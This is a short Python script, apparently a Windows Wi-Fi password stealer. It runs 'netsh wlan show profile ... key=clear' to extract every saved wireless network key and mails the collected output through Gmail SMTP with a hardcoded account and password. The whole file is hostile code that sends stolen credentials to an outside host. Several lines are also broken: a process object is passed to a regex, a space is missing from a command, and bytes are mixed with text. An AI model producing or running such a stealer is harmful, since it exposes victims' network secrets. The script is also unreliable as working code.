#!/usr/bin/env python

import subprocess, smtplib, re


def kirimpesan_nuz(email, password, pesan):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, pesan)
    server.quit()


perintah = "netsh wlan show profile "
net = subprocess.Popen(perintah, shell=True)
daftarnamanet = re.findall("(?:Profile\s*:\s)(.*)", net)

hasil = ""
for namanet in daftarnamanet:
    perintah = "netsh wlan show profile" + namanet + " key =clear"
    hasilny = subprocess.check_output(perintah, shell=True)
    hasil = hasil + hasilny

kirimpesan_nuz("nuz@gmail.com", "nuz111", hasil)

